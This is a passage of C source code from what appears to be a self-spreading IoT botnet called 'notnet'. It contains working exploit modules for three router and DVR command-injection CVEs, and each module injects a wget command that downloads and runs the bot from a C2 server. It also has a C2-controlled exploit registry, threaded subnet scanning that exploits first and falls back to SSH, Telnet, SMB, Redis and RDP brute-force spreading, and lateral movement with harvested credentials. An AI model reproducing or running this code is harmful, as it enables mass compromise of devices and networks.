        return -1;
    }
    char req[4096];
    snprintf(req, sizeof(req),
        "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=%.3500s HTTP/1.0\r\n"
        "Host: %s\r\nCookie: uid=1\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 0\r\n\r\n",
        enc, ip);
    char resp[1024];
    int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
    if (n <= 0) {
        log_warn("CVE-2024-3721: drop exchange failed on %s", ip);
        return -1;
    }
    log_info("CVE-2024-3721: payload dropped on %s:%d", ip, port);
    return 0;
}

/* ── CVE-2017-17215 — Huawei HG532 router ────────────────── */
/* TR-064/UPnP service on TCP 37215; the SOAP DeviceUpgrade action
 * injects shell metacharacters via NewStatusURL/NewDownloadURL.
 * Exploited by the Satori (Mirai Okiru) botnet — the first major
 * Mirai variant that spread via CVE exploitation instead of Telnet
 * default-credential brute-force. */
#define HG532_PORT 37215

static int cve_hg532_probe(const char *ip, uint16_t port, char *banner, size_t banner_len) {
    /* The vulnerable TR-064 service answers a benign SOAP request with
     * the "HUAWEIUPNP" marker. No shell metacharacters are sent here.
     * Content-Length is computed from the real body length (the old
     * hardcoded 480 exceeded the 372-byte body, so any CL-respecting
     * server blocked waiting for bytes that never arrived). */
    char body[512];
    snprintf(body, sizeof(body),
        "<?xml version=\"1.0\" ?>\n"
        "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n"
        "<s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n"
        "<NewStatusURL>http://127.0.0.1/status</NewStatusURL>\n"
        "<NewDownloadURL>http://127.0.0.1/download</NewDownloadURL>\n"
        "</u:Upgrade></s:Body></s:Envelope>");
    char req[1024];
    snprintf(req, sizeof(req),
        "POST /ctrlt/DeviceUpgrade_1 HTTP/1.0\r\n"
        "Host: %s:%d\r\nContent-Type: text/xml\r\n"
        "SOAPAction: urn:schemas-upnp-org:service:WANPPPConnection:1#DeviceUpgrade\r\n"
        "Content-Length: %zu\r\n\r\n%s",
        ip, port, strlen(body), body);
    char resp[1024];
    int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
    if (n <= 0) return 0;
    if (banner && banner_len > 0) snprintf(banner, banner_len, "%.900s", resp);
    return strstr(resp, "HUAWEIUPNP") ? 1 : 0;
}

static int cve_hg532_verify(const char *ip, uint16_t port) {
    /* Non-destructive proof: send the injection-shaped SOAP with a bare
     * echo (no payload). This HG532 build does not reflect command
     * output; a 200 response carrying the standard HUAWEIUPNP envelope
     * after an injected command proves the TR-064 channel accepted and
     * processed the injection. Payload drop is refused otherwise. */
    char token[32];
    snprintf(token, sizeof(token), "NOTNET%08x", random_uint32());
    char body[512];
    snprintf(body, sizeof(body),
        "<?xml version=\"1.0\" ?>\n"
        "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n"
        "<s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n"
        "<NewStatusURL>;echo %s;</NewStatusURL>\n"
        "<NewDownloadURL>;echo %s;</NewDownloadURL>\n"
        "</u:Upgrade></s:Body></s:Envelope>",
        token, token);
    char req[1536];
    snprintf(req, sizeof(req),
        "POST /ctrlt/DeviceUpgrade_1 HTTP/1.0\r\n"
        "Host: %s:%d\r\nContent-Type: text/xml\r\n"
        "SOAPAction: urn:schemas-upnp-org:service:WANPPPConnection:1#DeviceUpgrade\r\n"
        "Content-Length: %zu\r\n\r\n%s",
        ip, port, strlen(body), body);
    char resp[2048];
    int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
    if (n <= 0) return 0;
    return strstr(resp, "HUAWEIUPNP") ? 1 : 0;
}

static int cve_hg532_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
    char dl_url[512];
    snprintf(dl_url, sizeof(dl_url), "http://%.250s:%d/bot/notnet",
             bot->c2_http.server, PAYLOAD_DL_PORT);
    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
             "wget %.500s -O /tmp/.notnet; chmod +x /tmp/.notnet; /tmp/.notnet",
             dl_url);
    /* The command carries no '&' or '<'/'>', so no XML escaping and no
     * parameter splitting is needed; ';' separates the shell steps. */
    char body[1536];
    snprintf(body, sizeof(body),
        "<?xml version=\"1.0\" ?>\n"
        "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n"
        "<s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n"
        "<NewStatusURL>;%.500s;</NewStatusURL>\n"
        "<NewDownloadURL>;%.500s;</NewDownloadURL>\n"
        "</u:Upgrade></s:Body></s:Envelope>",
        cmd, cmd);
    char req[2048];
    snprintf(req, sizeof(req),
        "POST /ctrlt/DeviceUpgrade_1 HTTP/1.0\r\n"
        "Host: %s:%d\r\nContent-Type: text/xml\r\n"
        "SOAPAction: urn:schemas-upnp-org:service:WANPPPConnection:1#DeviceUpgrade\r\n"
        "Content-Length: %zu\r\n\r\n%s",
        ip, port, strlen(body), body);
    char resp[1024];
    int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
    if (n <= 0) {
        log_warn("CVE-2017-17215: drop exchange failed on %s", ip);
        return -1;
    }
    log_info("CVE-2017-17215: payload dropped on %s:%d", ip, port);
    return 0;
}

/* ── CVE-2021-35395 — Realtek Jungle SDK router/NVR ──────── */
/* The SDK's HTTP management interface (Boa/httpd, TCP 80) exposes
 * /boafrm/formSysCmd, which passes the sysCmd parameter to a shell and
 * echoes the output. Affects a large family of Realtek-SDK based
 * routers and NVRs across many brands; exploited by the Moobot Mirai
 * variant. */
#define REALTEK_PORT 80

static int cve_realtek_probe(const char *ip, uint16_t port, char *banner, size_t banner_len) {
    /* Passive family fingerprint: Realtek SDK devices identify via the
     * Boa/httpd server header or the Realtek marker in the login page. */
    char req[256];
    snprintf(req, sizeof(req), "GET / HTTP/1.0\r\nHost: %s\r\n\r\n", ip);
    char resp[1024];
    int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
    if (n <= 0) return 0;
    if (banner && banner_len > 0) snprintf(banner, banner_len, "%.900s", resp);
    if (cve_contains_ci(resp, "Boa") || cve_contains_ci(resp, "Realtek") ||
        cve_contains_ci(resp, "httpd")) return 1;
    return 0;
}

static int cve_realtek_verify(const char *ip, uint16_t port) {
    /* Non-destructive proof: formSysCmd echoes the command output in
     * the HTTP response body; require the unique token back. */
    char token[32];
    snprintf(token, sizeof(token), "NOTNET%08x", random_uint32());
    char body[128];
    snprintf(body, sizeof(body), "sysCmd=echo+%s", token);
    char req[512];
    snprintf(req, sizeof(req),
        "POST /boafrm/formSysCmd HTTP/1.0\r\n"
        "Host: %s:%d\r\nContent-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: %zu\r\n\r\n%s",
        ip, port, strlen(body), body);
    char resp[2048];
    int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
    if (n <= 0) return 0;
    return strstr(resp, token) ? 1 : 0;
}

static int cve_realtek_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
    char dl_url[512];
    snprintf(dl_url, sizeof(dl_url), "http://%.250s:%d/bot/notnet",
             bot->c2_http.server, PAYLOAD_DL_PORT);
    /* '+' is the form-encoded space; ';' separates the shell steps and
     * the raw URL contains no '&', so the value cannot split params. */
    char body[1536];
    snprintf(body, sizeof(body),
             "sysCmd=wget+%.500s+-O+/tmp/.notnet;chmod++x+/tmp/.notnet;/tmp/.notnet",
             dl_url);
    char req[2048];
    snprintf(req, sizeof(req),
        "POST /boafrm/formSysCmd HTTP/1.0\r\n"
        "Host: %s:%d\r\nContent-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: %zu\r\n\r\n%s",
        ip, port, strlen(body), body);
    char resp[1024];
    int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
    if (n <= 0) {
        log_warn("CVE-2021-35395: drop exchange failed on %s", ip);
        return -1;
    }
    log_info("CVE-2021-35395: payload dropped on %s:%d", ip, port);
    return 0;
}

/* ── Module table + runner ───────────────────────────────── */
/* The CVE module registry (#143): modules are compile-time linked
 * but registered/disabled at runtime. The C2 `cve enable <id>` /
 * `cve disable <id>` commands toggle which modules participate in
 * cve_run_modules() — a live feed without recompilation. */
typedef struct {
    const cve_module_t *mod;
    int enabled;
} cve_registry_entry_t;

static const cve_module_t cve_static_modules[] = {
    { "CVE-2024-3721", "TBK DVR-4104/4216 (DVR/NVR)", TBK_DVR_PORT,
      cve_tbk_probe, cve_tbk_verify, cve_tbk_drop },
    { "CVE-2017-17215", "Huawei HG532 (router)", HG532_PORT,
      cve_hg532_probe, cve_hg532_verify, cve_hg532_drop },
    { "CVE-2021-35395", "Realtek Jungle SDK (router/NVR)", REALTEK_PORT,
      cve_realtek_probe, cve_realtek_verify, cve_realtek_drop },
};
#define CVE_STATIC_COUNT ((int)(sizeof(cve_static_modules) / sizeof(cve_static_modules[0])))

static cve_registry_entry_t cve_registry[CVE_MAX_REGISTRY];
static int cve_registry_count = 0;

/* Initialize the registry with all modules enabled. Idempotent. */
static void cve_registry_init(void) {
    if (cve_registry_count > 0) return;
    for (int i = 0; i < CVE_STATIC_COUNT && i < CVE_MAX_REGISTRY; i++) {
        cve_registry[i].mod = &cve_static_modules[i];
        cve_registry[i].enabled = 1;
    }
    cve_registry_count = CVE_STATIC_COUNT;
}

int cve_module_count(void) {
    cve_registry_init();
    int n = 0;
    for (int i = 0; i < cve_registry_count; i++)
        if (cve_registry[i].enabled) n++;
    return n;
}

const cve_module_t *cve_module_at(int idx) {
    cve_registry_init();
    if (idx < 0) return NULL;
    int n = 0;
    for (int i = 0; i < cve_registry_count; i++) {
        if (!cve_registry[i].enabled) continue;
        if (n == idx) return cve_registry[i].mod;
        n++;
    }
    return NULL;
}

/* Enable a CVE module by id. Returns 0 on success, -1 if unknown. */
int cve_module_enable(const char *id) {
    if (!id) return -1;
    cve_registry_init();
    for (int i = 0; i < cve_registry_count; i++) {
        if (strcmp(cve_registry[i].mod->id, id) == 0) {
            cve_registry[i].enabled = 1;
            return 0;
        }
    }
    return -1;
}

/* Disable a CVE module by id. Returns 0 on success, -1 if unknown. */
int cve_module_disable(const char *id) {
    if (!id) return -1;
    cve_registry_init();
    for (int i = 0; i < cve_registry_count; i++) {
        if (strcmp(cve_registry[i].mod->id, id) == 0) {
            cve_registry[i].enabled = 0;
            return 0;
        }
    }
    return -1;
}

/* Render CVE registry status for the C2 `cve list` command. */
void cve_registry_status(char *buf, size_t len) {
    if (!buf || len == 0) return;
    cve_registry_init();
    int pos = 0;
    for (int i = 0; i < cve_registry_count; i++) {
        pos += snprintf(buf + pos, len - pos, "%s%s[%s]",
                        i ? " " : "",
                        cve_registry[i].mod->id,
                        cve_registry[i].enabled ? "ON" : "off");
        if (pos >= (int)len - 32) break;
    }
    if (cve_registry_count == 0) snprintf(buf, len, "cve: no modules registered");
}

/* Run all enabled modules matching the port (all when port == 0) in
 * probe -> verify -> drop order. A module fires only when probe
 * fingerprints the family AND verify positively confirms command
 * execution; drop is the payload delivery. Returns 0 when a module
 * dropped the payload, -1 when nothing fired. */
int cve_run_modules(notnet_bot_t *bot, const char *ip, uint16_t port) {
    if (!bot || !ip) return -1;
    cve_registry_init();

    for (int i = 0; i < cve_registry_count; i++) {
        if (!cve_registry[i].enabled) continue;
        const cve_module_t *m = cve_registry[i].mod;
        if (port != 0 && m->port != port) continue;

        char banner[1024] = {0};
        if (m->probe(ip, m->port, banner, sizeof(banner)) != 1) {
            log_debug("CVE: %s probe miss on %s:%d", m->id, ip, m->port);
            continue;
        }
        log_info("CVE: %s probe hit on %s:%d (%s) — %.100s",
                 m->id, ip, m->port, m->family, banner);

        if (m->verify(ip, m->port) != 1) {
            log_info("CVE: %s verify failed on %s:%d — no payload drop",
                     m->id, ip, m->port);
            continue;
        }
        log_info("CVE: %s verify passed on %s:%d — dropping payload",
                 m->id, ip, m->port);

        if (m->drop(bot, ip, m->port) == 0) {
            return 0;
        }
        log_warn("CVE: %s drop failed on %s:%d", m->id, ip, m->port);
    }
    return -1;
}

/* ── Core Spreading ─────────────────────────────────────── */
int scan_subnet(notnet_bot_t *bot, const char *subnet, uint8_t service_mask) {
    /* Parse subnet: 192.168.1.0/24 */
    char net[16], mask[4] = {0};
    if (sscanf(subnet, "%15[^/]/%3s", net, mask) < 2) {
        log_error("scan_subnet: invalid subnet format '%s' (expected a.b.c.d/nn)", subnet);
        return -1;
    }
    int prefix = atoi(mask);
    /* SECURITY FIX (#4): Validate prefix range to prevent integer overflow
     * in (1 << (32 - prefix)). Also reject prefixes smaller than /16 to
     * avoid scanning millions of IPs. */
    if (prefix < 16 || prefix > 32) {
        log_error("scan_subnet: invalid prefix %d (must be 16-32)", prefix);
        return -1;
    }
    
    /* SECURITY FIX (#4): Use inet_pton instead of inet_addr (deprecated,
     * inet_addr returns INADDR_NONE for both error and 255.255.255.255). */
    struct in_addr in;
    if (inet_pton(AF_INET, net, &in) != 1) {
        log_error("scan_subnet: invalid IP %s", net);
        return -1;
    }
    uint32_t net_ip = in.s_addr;  /* already in network byte order */
    
    uint32_t host_ip = ntohl(net_ip);
    /* With prefix clamped to [16,32], (1<<(32-prefix)) is at most 1<<16 = 65536 */
    int hosts = (1 << (32 - prefix)) - 2; /* exclude network and broadcast */
    /* Hard cap at 254 even for /16+ to prevent runaway scanning */
    if (hosts > 254) hosts = 254;
    if (bot->scan_max_hosts > 0 && bot->scan_max_hosts < (uint32_t)hosts) {
        hosts = (int)bot->scan_max_hosts;
    }
    if (hosts < 1) hosts = 1;  /* guarantee at least one iteration */
    
    /* Use config timeout, fall back to compile-time default */
    int timeout = SCAN_TIMEOUT_MS;
    if (bot->scan_timeout_ms > 0) timeout = (int)bot->scan_timeout_ms;

    log_info("scan: %s/%s (%d hosts) mask=0x%x timeout=%dms", net, mask, hosts, service_mask, timeout);
    
    for (int i = 1; i <= hosts; i++) {
        if (!(i % 50)) {
            log_info("scan: %d/%d done", i, hosts);
        }
        
        uint32_t ip = host_ip + i;
        char ip_str[16];
        snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d",
                 (ip >> 24) & 0xFF, (ip >> 16) & 0xFF,
                 (ip >> 8) & 0xFF, ip & 0xFF);
        
        /* Scan target services based on mask */
        if (service_mask & SPREAD_SSH) {
            scan_port_with_timeout(ip_str, 22, timeout);
        }
        if (service_mask & SPREAD_TELNET) {
            scan_port_with_timeout(ip_str, 23, timeout);
        }
        if (service_mask & SPREAD_SMB) {
            scan_port_with_timeout(ip_str, 445, timeout);
        }
        if (service_mask & SPREAD_REDIS) {
            scan_port_with_timeout(ip_str, 6379, timeout);
        }
        if (service_mask & SPREAD_RDP) {
            scan_port_with_timeout(ip_str, 3389, timeout);
        }
    }
    
    return 0;
}

/* Lightweight port scan that only checks if ports are open (no spreading).
 * Returns a string of "ip:port" for each open port found.
 * Caller must free(). Returns NULL on error. */
#define SCAN_RESULT_MAX        4096
/* Reserve headroom for the "N open ports: " header that is prepended
 * after the entries are appended (CWE-122 #103). The header is built
 * into a 64-byte buffer, so worst case is 63 chars; refusing the append
 * once this reserve is used guarantees the prepend always fits. */
#define SCAN_RESULT_HEADER_RESERVE 64

char *scan_ports(const char *target, uint16_t *ports, int port_count) {
    /* Parse target: "192.168.1.0/24" or "192.168.1.1:22,23,445" */
    char ip[16] = {0};
    int is_subnet = 0;
    char subnet_buf[16] = {0};

    char *slash = strchr(target, '/');
    char *colon = strchr(target, ':');

    if (slash) {
        /* Subnet format: 192.168.1.0/24 */
        int n = slash - target;
        if (n > 15) n = 15;
        memcpy(ip, target, n);
        ip[n] = '\0';
        is_subnet = 1;
        strncpy(subnet_buf, target, 15);
        subnet_buf[15] = '\0';
    } else if (colon) {
        /* Single IP with ports: 192.168.1.1:22,23 */
        int n = colon - target;
        if (n > 15) n = 15;
        memcpy(ip, target, n);
        ip[n] = '\0';
    } else {
        /* Just IP */
        strncpy(ip, target, 15);
        ip[15] = '\0';
    }

    /* Build result string */
    char *result = (char *)malloc(SCAN_RESULT_MAX);
    if (!result) return NULL;
    result[0] = '\0';
    int total_open = 0;

    if (is_subnet) {
        /* Parse subnet */
        char net[16], mask[4] = {0};
        if (sscanf(subnet_buf, "%15[^/]/%3s", net, mask) < 2) {
            free(result);
            return NULL;
        }
        int prefix = atoi(mask);
        if (prefix < 16 || prefix > 32) {
            free(result);
            return NULL;
        }

        struct in_addr in;
        if (inet_pton(AF_INET, net, &in) != 1) {
            free(result);
            return NULL;
        }

        uint32_t host_ip = ntohl(in.s_addr);
        int hosts = (1 << (32 - prefix)) - 2;
        if (hosts > 254) hosts = 254;
        if (hosts < 1) hosts = 1;

        for (int i = 1; i <= hosts; i++) {
            uint32_t cur_ip = host_ip + i;
            char ip_str[16];
            snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d",
                     (cur_ip >> 24) & 0xFF, (cur_ip >> 16) & 0xFF,
                     (cur_ip >> 8) & 0xFF, cur_ip & 0xFF);

            for (int p = 0; p < port_count; p++) {
                int sock = create_connection(ip_str, ports[p], SCAN_TIMEOUT_MS);
                if (sock >= 0) {
                    char entry[64];
                    int elen = snprintf(entry, sizeof(entry), "%s:%d ", ip_str, ports[p]);
                    if (strlen(result) + (size_t)elen < SCAN_RESULT_MAX - SCAN_RESULT_HEADER_RESERVE) {
                        strcat(result, entry);
                        total_open++;
                    }
                    close(sock);
                }
            }
        }
    } else {
        /* Single IP */
        for (int p = 0; p < port_count; p++) {
            int sock = create_connection(ip, ports[p], SCAN_TIMEOUT_MS);
            if (sock >= 0) {
                char entry[64];
                int elen = snprintf(entry, sizeof(entry), "%s:%d ", ip, ports[p]);
                if (strlen(result) + (size_t)elen < SCAN_RESULT_MAX - SCAN_RESULT_HEADER_RESERVE) {
                    strcat(result, entry);
                    total_open++;
                }
                close(sock);
            }
        }
    }

    if (total_open == 0) {
        snprintf(result, SCAN_RESULT_MAX, "no open ports found");
    } else {
        char header[64];
        snprintf(header, sizeof(header), "%d open ports: ", total_open);
        /* Prepend header — the append guard reserved SCAN_RESULT_HEADER_RESERVE
         * bytes, so header + entries + NUL always fit in SCAN_RESULT_MAX.
         * Keep the guard here anyway (defense in depth). */
        int rlen = (int)strlen(result);
        size_t hlen = strlen(header);
        if (hlen + (size_t)rlen + 1 <= SCAN_RESULT_MAX) {
            memmove(result + hlen, result, (size_t)rlen + 1);
            memcpy(result, header, hlen);
        }
    }

    return result;
}

/* ── Threaded scanning ────────────────────────────────── */
/* Thread argument: base IP index, count, bot pointer, service mask */
#include <pthread.h>

typedef struct {
    notnet_bot_t *bot;
    uint32_t host_ip;
    int start;
    int count;
    uint8_t service_mask;
} scan_thread_arg_t;

static void *scan_thread_fn(void *arg) {
    scan_thread_arg_t *a = (scan_thread_arg_t *)arg;
    notnet_bot_t *bot = a->bot;

    int timeout = SCAN_TIMEOUT_MS;
    if (bot->scan_timeout_ms > 0) timeout = (int)bot->scan_timeout_ms;

    for (int i = a->start; i < a->start + a->count; i++) {
        uint32_t ip = a->host_ip + i;
        char ip_str[16];
        snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d",
                 (ip >> 24) & 0xFF, (ip >> 16) & 0xFF,
                 (ip >> 8) & 0xFF, ip & 0xFF);

        if (a->service_mask & SPREAD_SSH) {
            if (scan_port_with_timeout(ip_str, 22, timeout) == 0) {
                /* #83: CVE modules first; brute-force is fallback */
                if (cve_run_modules(bot, ip_str, 22) != 0) {
                    spread_ssh(bot, ip_str, 22);
                }
            }
        }
        if (a->service_mask & SPREAD_TELNET) {
            if (scan_port_with_timeout(ip_str, 23, timeout) == 0) {
                /* #83: Telnet default-cred brute-force is the fallback
                 * vector; CVE modules run first. */
                if (cve_run_modules(bot, ip_str, 23) != 0) {
                    spread_telnet(bot, ip_str, 23);
                }
            }
        }
        if (a->service_mask & SPREAD_SMB) {
            if (scan_port_with_timeout(ip_str, 445, timeout) == 0) {
                if (cve_run_modules(bot, ip_str, 445) != 0) {
                    spread_smb(bot, ip_str, 445);
                }
            }
        }
        if (a->service_mask & SPREAD_REDIS) {
            if (scan_port_with_timeout(ip_str, 6379, timeout) == 0) {
                if (cve_run_modules(bot, ip_str, 6379) != 0) {
                    spread_redis(bot, ip_str, 6379);
                }
            }
        }
        if (a->service_mask & SPREAD_RDP) {
            if (scan_port_with_timeout(ip_str, 3389, timeout) == 0) {
                if (cve_run_modules(bot, ip_str, 3389) != 0) {
                    spread_rdp(bot, ip_str, 3389);
                }
            }
        }
        /* #97: CVE ports — the autonomous scan must reach 80 (TBK DVR,
         * Realtek) and 37215 (HG532), otherwise known-CVE exploitation
         * only ever fires from the C2 `spread` command. These run
         * unconditionally (CVE-first primary vector, #83); cve_run_modules
         * does probe -> verify -> drop and returns -1 when nothing fires.
         * Port 80 covers both TBK and Realtek modules (same port). */
        if (scan_port_with_timeout(ip_str, TBK_DVR_PORT, timeout) == 0) {
            cve_run_modules(bot, ip_str, TBK_DVR_PORT);
        }
        if (scan_port_with_timeout(ip_str, HG532_PORT, timeout) == 0) {
            cve_run_modules(bot, ip_str, HG532_PORT);
        }
    }

    return NULL;
}

/* Implements spawn_scan_threads() declared in spread.h (#73).
 * Splits a /24 subnet across SCAN_THREAD_COUNT threads. */
int spawn_scan_threads(notnet_bot_t *bot, const char *subnet, uint8_t service_mask) {
    /* Parse subnet same as scan_subnet */
    char net[16], mask[4] = {0};
    if (sscanf(subnet, "%15[^/]/%3s", net, mask) < 2) {
        log_error("spawn_scan_threads: invalid subnet '%s'", subnet);
        return -1;
    }
    int prefix = atoi(mask);
    if (prefix < 16 || prefix > 32) {
        log_error("spawn_scan_threads: prefix %d out of range", prefix);
        return -1;
    }

    struct in_addr in;
    if (inet_pton(AF_INET, net, &in) != 1) {
        log_error("spawn_scan_threads: invalid IP %s", net);
        return -1;
    }

    uint32_t host_ip = ntohl(in.s_addr);
    int hosts = (1 << (32 - prefix)) - 2;
    if (hosts > 254) hosts = 254;
    if (hosts < 1) hosts = 1;

    int threads = SCAN_THREAD_COUNT;
    if (threads > hosts) threads = hosts;
    if (threads < 1) threads = 1;

    log_info("spawn_scan_threads: %d threads for %d hosts", threads, hosts);

    int per_thread = (hosts + threads - 1) / threads;
    pthread_t tid[SCAN_THREAD_COUNT];
    scan_thread_arg_t args[SCAN_THREAD_COUNT];
    int spawned = 0;

    for (int t = 0; t < threads; t++) {
        args[t].bot = bot;
        args[t].host_ip = host_ip;
        args[t].start = t * per_thread + 1;
        args[t].count = per_thread;
        /* clip last thread to actual remaining hosts */
        if (t == threads - 1) {
            args[t].count = hosts - (t * per_thread);
        }
        args[t].service_mask = service_mask;

        if (pthread_create(&tid[t], NULL, scan_thread_fn, &args[t]) != 0) {
            log_error("spawn_scan_threads: pthread_create failed");
            break;
        }
        spawned++;
    }

    /* Wait for the threads that were actually created — on a partial
     * spawn failure (EAGAIN under scan pressure), joining tid[spawned..]
     * would pass uninitialized pthread_t values to pthread_join (UB,
     * CWE-457 #105). */
    for (int t = 0; t < spawned; t++) {
        pthread_join(tid[t], NULL);
    }

    return 0;
}

int spread_local(notnet_bot_t *bot) {
    log_info("Local spread cycle started");

    /* #144: LOTL first. If we have harvested creds, spend them on lateral
     * movement before brute-force. LOTL is quieter: no CVE scan noise,
     * no brute-force bursts — just native-tool auth + payload drop. */
    if (spread_cred_count() > 0) {
        int spent = lotl_run_cycle(bot);
        if (spent > 0) {
            log_info("LOTL: %d credentials spent, skipping brute cycle", spent);
            return 0;
        }
    }

    /* Spread explicit targets if configured (overrides defaults).
     * Uses spawn_scan_threads() — the CVE-first per-open-port spreader —
     * not scan_subnet() (probe-only, #95). */
    if (bot->scan_target_count > 0) {
        log_info("Scanning %d explicit targets", bot->scan_target_count);
        uint8_t all_services = SPREAD_SSH | SPREAD_TELNET | SPREAD_SMB | SPREAD_REDIS | SPREAD_RDP;
        for (int i = 0; i < bot->scan_target_count && i < 16; i++) {
            spawn_scan_threads(bot, bot->scan_targets[i], all_services);
        }
        return 0;
    }
    
    /* Default: just scan local /24 (not /16) */
    spawn_scan_threads(bot, "192.168.1.0/24",
                SPREAD_SSH | SPREAD_TELNET | SPREAD_SMB | SPREAD_REDIS | SPREAD_RDP);
    
    return 0;
}
